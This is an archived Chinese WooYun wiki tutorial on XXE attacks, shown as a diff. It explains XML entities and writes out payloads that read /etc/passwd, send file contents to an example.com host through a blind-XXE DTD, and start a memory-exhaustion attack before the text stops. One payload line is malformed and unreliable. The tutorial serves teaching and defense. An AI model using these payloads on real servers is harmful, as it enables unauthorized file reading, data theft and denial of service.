@@ -1,0 +1,425 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="exporter-version" content="Evernote Mac 6.8 (453748)"/><meta name="created" content="2016-10-19 12:49:50 +0000"/><meta name="source" content="web.clip"/><meta name="source-url" content="http://wiki.wooyun.org/web:xxe-attack"/><meta name="updated" content="2016-10-19 12:49:50 +0000"/><title>web:xxe-attack [WooYun WiKi]</title></head><body><div style="-evernote-webclip:true"><br/><div style="font-size: 16px"><div style="box-sizing:border-box;font-family:sans-serif;text-size-adjust:100%;font-size:10px;-webkit-tap-highlight-color:rgba(0, 0, 0, 0);"><div style="box-sizing:border-box;font-family:&quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:small;line-height:1.42857;color:rgb(51, 51, 51);background:rgb(253, 253, 253);"><div style="box-sizing:border-box;"><div style="box-sizing:border-box;"><span style="box-sizing:border-box;"><div style="box-sizing:border-box;"><div style="box-sizing:border-box;background-color:rgb(255, 255, 255);border-radius:4px;box-shadow:rgba(0, 0, 0, 0.0470588) 0px 1px 1px;"><div style="box-sizing:border-box;"><span style="display:table;"/>
+
+                                          
+              <div style="box-sizing:border-box;position:fixed;float:right;z-index:1024;top:10px;right:10px;">
+                
+<div style="float:right;box-sizing:border-box;background-color:rgb(255, 255, 255);border-radius:4px;box-shadow:rgba(0, 0, 0, 0.0470588) 0px 1px 1px;border-color:rgb(221, 221, 221);border:1px solid transparent;margin:0px 0px 1.4em 1.4em;width:auto;color:inherit;font-size:0.95em;margin-left:20px;">
+<h3 style="border-bottom:1px solid transparent;box-sizing:border-box;border-top-left-radius:3px;font-weight:bold;color:rgb(51, 51, 51);border-color:rgb(221, 221, 221);background-color:rgb(245, 245, 245);font-family:inherit;line-height:1.1;border-top-right-radius:3px;padding:5px;font-size:0.95em;margin:0px;cursor:pointer;"><i style="box-sizing:border-box;position:relative;top:1px;display:inline-block;font-family:&quot;Glyphicons Halflings&quot;;font-style:normal;font-weight:400;line-height:1;-webkit-font-smoothing:antialiased;padding-right:5px;"><span style="font-family:&quot;Glyphicons Halflings&quot;;font-style:normal;font-weight:400;line-height:1;"></span></i> <strong style="line-height:1;font-weight:400;top:1px;display:inline-block;font-family:&quot;Glyphicons Halflings&quot;;font-style:normal;position:relative;-webkit-font-smoothing:antialiased;box-sizing:border-box;float:right;margin:0px 0.2em;padding-right:5px;"><span style="font-weight:400;font-family:&quot;Glyphicons Halflings&quot;;font-style:normal;line-height:1;"></span></strong></h3>
+
+</div>
+
+              </div>
+
+              
+              
+<h1 style="box-sizing:border-box;font-size:36px;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin:40px 0px 20px;padding-bottom:9px;border-bottom:1px solid rgb(238, 238, 238);margin-top:10px;">XML External Entity attack/XXE攻击</h1>
+<div style="box-sizing:border-box;"
+
+/>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">1、相关背景介绍</h3>
+<div style="box-sizing:border-box;">
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<strong style="box-sizing:border-box;font-weight:700;">可扩展标记语言（eXtensible Markup Language，XML）</strong>是一种标记语言，被设计用来传输和存储数据。XML应用极其广泛，如：
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;">  
+* 普通列表项目文档格式：OOXML，ODF，PDF，RSS……
+* 图片格式：SVG，EXIF Headers……
+* 网络协议：WebDAV，CalDAV，XMLRPC，SOAP，REST，XMPP，SAML，XACML……
+* 配置文件：Spring配置文件，Struts2配置文件……</pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+在XML 1.0标准中定义了实体的概念，实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体可在内部或外部进行声明。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+包含内部实体的XML文档：
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;?xml</span> <span style="box-sizing:border-box;color:rgb(0, 0, 255);">version</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">"1.0"</span> <span style="box-sizing:border-box;color:rgb(0, 0, 255);">encoding</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">"utf-8"</span><span style="box-sizing:border-box;color:rgb(153, 51, 51);">?&gt;</span></span>
+ 
+<span style="box-sizing:border-box;">&lt;!DOCTYPE entity [</span>
+<span style="box-sizing:border-box;">  &lt;!ENTITY copyright "Copyright wiki.wooyun.org"&gt;</span>
+]&gt;
+ 
+<span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;wooyun<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span>
+  <span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;internal<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span><span style="box-sizing:border-box;">&amp;copyright;</span><span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;/internal<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span>
+<span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;/wooyun<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span></pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+包含外部实体的XML文档：
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;?xml</span> <span style="box-sizing:border-box;color:rgb(0, 0, 255);">version</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">"1.0"</span> <span style="box-sizing:border-box;color:rgb(0, 0, 255);">encoding</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">"utf-8"</span><span style="box-sizing:border-box;color:rgb(153, 51, 51);">?&gt;</span></span>
+ 
+<span style="box-sizing:border-box;">&lt;!DOCTYPE entity [</span>
+<span style="box-sizing:border-box;">  &lt;!ENTITY wiki SYSTEM "http://wiki.wooyun.org/"&gt;</span>
+]&gt;
+ 
+<span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;wooyun<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span>
+  <span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;external<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span><span style="box-sizing:border-box;">&amp;wiki;</span><span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;/external<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span>
+<span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;/wooyun<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span></pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+在解析XML时，实体将会被替换成相应的引用内容。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<strong style="box-sizing:border-box;font-weight:700;">XML外部实体（XML External Entity，XXE）攻击</strong>是一种常见的Web安全漏洞，攻击者可以通过XML的外部实体获取服务器中本应被保护的数据。
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">2、成因</h3>
+<div style="box-sizing:border-box;">
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+XML解析器解析外部实体时支持多种协议：
+</p>
+<div style="box-sizing:border-box;width:100%;margin-bottom:20px;overflow-y:hidden;border:1px solid rgb(221, 221, 221);max-width:100%;min-height:0.01%;overflow-x:auto;"><table style="border-spacing:0px;font-size:inherit;font-style:inherit;font-variant:inherit;box-sizing:border-box;font-weight:inherit;border-collapse:collapse;width:100%;max-width:100%;margin-bottom:0px;background-color:rgb(255, 255, 255);">
+	<tbody style="box-sizing:border-box;"><tr style="box-sizing:border-box;background-color:rgb(249, 249, 249);">
+		<td style="box-sizing:border-box;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">libxml2 </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">PHP             </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">Java    </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">.NET    </td>
+	</tr>
+	<tr style="box-sizing:border-box;">
+		<td style="box-sizing:border-box;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">——–</td><td style="box-sizing:border-box;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">—————-</td><td style="box-sizing:border-box;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">——–</td><td style="box-sizing:border-box;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">——–</td>
+	</tr>
+	<tr style="box-sizing:border-box;background-color:rgb(249, 249, 249);">
+		<td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">file    </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">file            </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">file    </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">file    </td>
+	</tr>
+	<tr style="box-sizing:border-box;">
+		<td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">http    </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">http            </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">http    </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">http    </td>
+	</tr>
+	<tr style="box-sizing:border-box;background-color:rgb(249, 249, 249);">
+		<td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">ftp     </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">ftp             </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">ftp     </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">ftp     </td>
+	</tr>
+	<tr style="box-sizing:border-box;">
+		<td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;"        /><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">php             </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">https   </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">https   </td>
+	</tr>
+	<tr style="box-sizing:border-box;background-color:rgb(249, 249, 249);">
+		<td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;"        /><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">compress.zlib   </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">jar     </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;"        />
+	</tr>
+	<tr style="box-sizing:border-box;">
+		<td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;"        /><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">data            </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">netdoc  </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;"        />
+	</tr>
+	<tr style="box-sizing:border-box;background-color:rgb(249, 249, 249);">
+		<td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;"        /><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">glob            </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">mailto  </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;"        />
+	</tr>
+	<tr style="box-sizing:border-box;">
+		<td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;"        /><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">phar            </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">gopher  </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;"        />
+	</tr>
+</tbody></table></div>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+如使用file协议可以读取本地文件内容、使用http协议可以获取Web资源等，因此攻击者可构造恶意的外部实体，当解析器解析了包含“恶意”外部实体的XML类型文件时，便会导致被XXE攻击。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+下面这个XML被解析时便会将本地<code style="box-sizing:border-box;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;font-size:90%;padding:2px 4px;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);border-radius:4px;">/etc/passwd</code>文件的内容读出来：
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;?xml</span> <span style="box-sizing:border-box;color:rgb(0, 0, 255);">version</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">"1.0"</span> <span style="box-sizing:border-box;color:rgb(0, 0, 255);">encoding</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">"utf-8"</span><span style="box-sizing:border-box;color:rgb(153, 51, 51);">?&gt;</span></span>
+ 
+<span style="box-sizing:border-box;">&lt;!DOCTYPE entity [</span>
+<span style="box-sizing:border-box;">  &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;</span>
+]&gt;
+ 
+<span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;wooyun<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span>
+  <span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;external<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span><span style="box-sizing:border-box;">&amp;file;</span><span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;/external<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span>
+<span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;/wooyun<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span></pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<em style="box-sizing:border-box;">注：如果读取的文件本身包含“&lt;”、“&amp;”等字符时会产生失败的情况，对于此类文件可以使用Base64编码绕过，具体方法如下：</em>
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;?xml</span> <span style="box-sizing:border-box;color:rgb(0, 0, 255);">version</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">"1.0"</span> <span style="box-sizing:border-box;color:rgb(0, 0, 255);">encoding</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">"utf-8"</span><span style="box-sizing:border-box;color:rgb(153, 51, 51);">?&gt;</span></span>
+ 
+<span style="box-sizing:border-box;">&lt;!DOCTYPE entity [</span>
+<span style="box-sizing:border-box;">  &lt;!ENTITY file SYSTEM ENTITY e SYSTEM "php://filter/read=convert.base64-encode/resource=http://wiki.wooyun.org"&gt;</span>
+]&gt;
+ 
+<span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;wooyun<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span>
+  <span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;external<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span><span style="box-sizing:border-box;">&amp;file;</span><span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;/external<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span>
+<span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;/wooyun<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span></pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+不同的解析器可能默认对于外部实体会有不同的处理规则,以PHP语言为例，xml_parse的实现方式为expat库，而simplexml_load使用的是libxml库，两个底层库在解析的时候细节并不一样，expat默认对外部实体并不解析，而simplexml_load默认情况下会解析外部实体等，所以simplexml_load函数会受此问题影响，而xml_parse则默认不会受到影响。下面是几种常见语言可能会受到此问题影响的解析XML的方法：
+</p>
+<div style="box-sizing:border-box;width:100%;margin-bottom:20px;overflow-y:hidden;border:1px solid rgb(221, 221, 221);max-width:100%;min-height:0.01%;overflow-x:auto;"><table style="border-spacing:0px;font-size:inherit;font-style:inherit;font-variant:inherit;box-sizing:border-box;font-weight:inherit;border-collapse:collapse;width:100%;max-width:100%;margin-bottom:0px;background-color:rgb(255, 255, 255);">
+	<tbody style="box-sizing:border-box;"><tr style="box-sizing:border-box;background-color:rgb(249, 249, 249);">
+		<td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">PHP         </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">Java            </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">.NET                    </td>
+	</tr>
+	<tr style="box-sizing:border-box;">
+		<td style="box-sizing:border-box;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">————</td><td style="box-sizing:border-box;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">—————-</td><td style="box-sizing:border-box;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">————————</td>
+	</tr>
+	<tr style="box-sizing:border-box;background-color:rgb(249, 249, 249);">
+		<td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">DOM         </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">（待补充）       </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">System.Xml.XmlDocument  </td>
+	</tr>
+	<tr style="box-sizing:border-box;">
+		<td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">SimpleXML   </td><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;"                /><td style="box-sizing:border-box;text-align:left;padding:5px;line-height:1.42857;vertical-align:top;border-top:1px solid rgb(221, 221, 221);white-space:nowrap;">System.Xml.XmlReader    </td>
+	</tr>
+</tbody></table></div>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">3、攻击方式及危害</h3>
+<div style="box-sizing:border-box;">
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+XXE的攻击方式分为<strong style="box-sizing:border-box;font-weight:700;">显式攻击</strong>和<strong style="box-sizing:border-box;font-weight:700;">盲攻击</strong>两种：
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+上述POC即为显式攻击，攻击者通过正常的回显将外部实体里的内容读取出来。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+但是，在有些情况下无法通过这种方式完成XXE攻击，这时我们可以采取盲攻击的办法。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+XXE盲攻击利用参数实体将本地文件内容读出来后，作为URL中的参数向其指定服务器发起请求，然后在其指定服务器的日志（Apache日志）中读出文件的内容。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+因在dtd中使用%来定义参数实体的方式只能在外部子集中使用，或由外部文件定义参数实体，引用到XML文件的dtd来使用，所以XML文件稍有不同：
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;?xml</span> <span style="box-sizing:border-box;color:rgb(0, 0, 255);">version</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">"1.0"</span> <span style="box-sizing:border-box;color:rgb(0, 0, 255);">encoding</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">"utf-8"</span><span style="box-sizing:border-box;color:rgb(153, 51, 51);">?&gt;</span></span>
+ 
+<span style="box-sizing:border-box;">&lt;!DOCTYPE entity [</span>
+<span style="box-sizing:border-box;">  &lt;!ENTITY % call SYSTEM "http://example.com/evil.xml"&gt;</span>
+  %call;
+]&gt;
+ 
+<span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;wooyun<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span>
+  <span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;text<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span>test<span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;/text<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span>
+<span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;/wooyun<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span></pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+其中<code style="box-sizing:border-box;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;font-size:90%;padding:2px 4px;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);border-radius:4px;"><a href="https://web.archive.org/web/20160124235011/http://example.com/evil.xml" title="http://example.com/evil.xml" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">http://example.com/evil.xml</a></code>里的内容是：
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;">&lt;!ENTITY % file SYSTEM <span style="box-sizing:border-box;color:rgb(255, 0, 0);">"file:///etc/passwd"</span><span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span>
+<span style="box-sizing:border-box;">&lt;!ENTITY % int <span style="box-sizing:border-box;color:rgb(255, 0, 0);">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://example.com/?file=%file;'&gt;</span></span>"&gt;
+%int;
+%send;</pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+危害：
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+XXE漏洞会导致读取任意未授权文件，如上述POC即可读取服务器中的<code style="box-sizing:border-box;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;font-size:90%;padding:2px 4px;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);border-radius:4px;">/etc/passwd</code>文件；
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+因为基于树的XML解析器会把全部加载到内存中，因此XXE漏洞也有可能被用来恶意消耗内存进行拒绝服务攻击，例如:
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;?xml</span> version = <span style="box-sizing:border-box;color:rgb(255, 0, 0);">"1.0"</span><span style="box-sizing:border-box;color:rgb(153, 51, 51);">?&gt;</span></span>
+ 
+<span style="box-sizing:border-box;">&lt;!DOCTYPE entity [  </span>
+<span style="box-sizing:border-box;">    &lt;!ENTITY wooyun "wooyun"&gt;</span>
